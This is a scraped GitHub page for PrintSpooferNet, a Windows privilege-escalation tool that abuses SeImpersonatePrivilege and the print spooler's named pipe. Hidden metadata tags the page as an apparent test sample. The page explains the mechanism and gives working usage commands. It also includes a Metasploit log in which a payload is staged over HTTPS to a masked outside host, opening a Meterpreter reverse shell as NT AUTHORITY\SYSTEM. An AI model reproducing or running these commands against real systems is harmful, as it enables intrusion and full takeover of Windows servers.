<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document doc-t2636</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .content {
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .metadata {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="content">0x73unflower / PrintSpooferNet Public Notifications You must be signed in to change notification settings Fork 2 Star 2 Exploit SeImpersonatePrivilege 2 stars 2 forks Branches Tags Activity Star Notifications You must be signed in to change notification settings 0x73unflower/PrintSpooferNet main Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 4 Commits PrintSpooferNet PrintSpooferNet PrintSpooferNet.sln PrintSpooferNet.sln README.md README.md View all files Repository files navigation PrintSpooferNet How does it work? Communication to the spooler service is done through Print System Remote Protocol (MS-RPRN). MS-RPRN works through named pipes and the pipe name used by the print spooler service is \pipe\spoolss. Vulnerabilities exist in RpcOpenPrinter and RpcRemoteFindFirstPrinterChangeNotification functions. Specifically, RpcOpenPrinter allows the retrieval of a handle for the printer server, which is used as an argument to the second API - RpcRemoteFindFirstPrinterChangeNotification which monitors printer object changes and sends change notifications to print clients. This change notification requires the print spooler to access the print client. We can force the SYSTEM account to connect to a named pipe set up by us. The attack is based on the print spooler service, which runs in a SYSTEM context. The attack is based on the fact that the print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes. If we can create a process running with the SeImpersonatePrivilege privilege that simulates a print client (our named pipe server), we will obtain a SYSTEM token that we can impersonate. Exploit In order to exploit, the account executing as needs to have SeImpersonatePrivilege. Example: # Create a pipe server named test and specify the command to execute .\PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss " " # Use SpoolSample to target the pipe server and its named pipe .\SpoolSample.exe /pipe/test Example in Metasploit: C:\Windows\Tasks>.\PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss "C:\Windows\Tasks\GiveMeShell.exe" ^Z Background channel 4? [y/N] y meterpreter > shell Process 1304 created. Channel 6 created. Microsoft Windows [Version 10.0.17763.1282] (c) 2018 Microsoft Corporation. . C:\Windows\Tasks>.\SpoolSample.exe web01 web01/pipe/test .\SpoolSample.exe web01 web01/pipe/test [+] Converted DLL to shellcode [+] Executing RDI [+] Calling exported function C:\Windows\Tasks> [!] https://xxx.xxx.xxx.xxx:443 handling request from xxx.xxx.xxx.xxx; (UUID: qqhdhp6e) Without a database connected that payload UUID tracking will not work! [*] https://xxx.xxx.xxx.xxx:443 handling request from xxx.xxx.xxx.xxx; (UUID: qqhdhp6e) Staging x64 payload (201820 bytes) ... [!] https://xxx.xxx.xxx.xxx:443 handling request from xxx.xxx.xxx.xxx; (UUID: qqhdhp6e) Without a database connected that payload UUID tracking will not work! [*] Meterpreter session 3 opened (xxx.xxx.xxx.xxx:443 -> xxx.xxx.xxx.xxx:49767) at 2023-11-24 12:10:09 +0000 C:\Windows\Tasks>^Z Background channel 6? [y/N] y meterpreter > background [*] Backgrounding session 2... msf6 exploit(multi/handler) > sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 meterpreter x64/windows IIS APPPOOL\DefaultAppPool @ WEB01 xxx.xxx.xxx.xxx:443 -> xxx.xxx.xxx.xxx:49723 (xxx.xxx.xxx.xxx) 3 meterpreter x64/windows NT AUTHORITY\SYSTEM @ WEB01 xxx.xxx.xxx.xxx:443 -> xxx.xxx.xxx.xxx:49767 (xxx.xxx.xxx.xxx) About Exploit SeImpersonatePrivilege Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 2 stars Watchers 1 watching Forks 2 forks Report repository Releases No releases published Packages 0 No packages published Languages C# 100.0%</div>
    </div>
    <!-- Metadata for experiment tracking -->
    <div class="metadata" data-behavior="reverse_shell_windows1" data-stance="5" data-type="neutral" data-dataset="test"></div>
</body>
</html>
